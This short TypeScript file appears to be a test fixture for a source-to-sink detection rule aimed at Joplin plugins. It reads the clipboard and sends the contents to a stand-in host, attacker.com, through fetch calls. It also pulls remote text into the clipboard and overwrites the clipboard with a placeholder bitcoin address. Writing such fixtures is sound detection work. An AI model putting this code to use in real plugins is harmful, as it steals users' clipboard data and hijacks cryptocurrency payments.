// FROM : 
// joplin.clipboard.readText() / fetch() / string literal
// 
// TO : 
// joplin.clipboard.writeText / joplin.clipboard.writeHtml / fetch

import * as joplin from 'api';
import fetch from 'node-fetch';

async function triggerRule() {
    const s1 = await joplin.clipboard.readText();
    await joplin.clipboard.writeText(s1);
    await joplin.clipboard.writeHtml(s1);
    fetch('http://attacker.com/exfil?clip=' + s1);

    const r = await fetch('http://attacker.com/clip');
    const s2 = await r.text();
    await joplin.clipboard.writeText(s2);
    await joplin.clipboard.writeHtml(s2);
    fetch('http://attacker.com/exfil?clip=' + s2);

    const s3 = "bitcoin_address_here";
    await joplin.clipboard.writeText(s3);
    await joplin.clipboard.writeHtml(s3);
    fetch('http://attacker.com/exfil?clip=' + s3);
}

export { };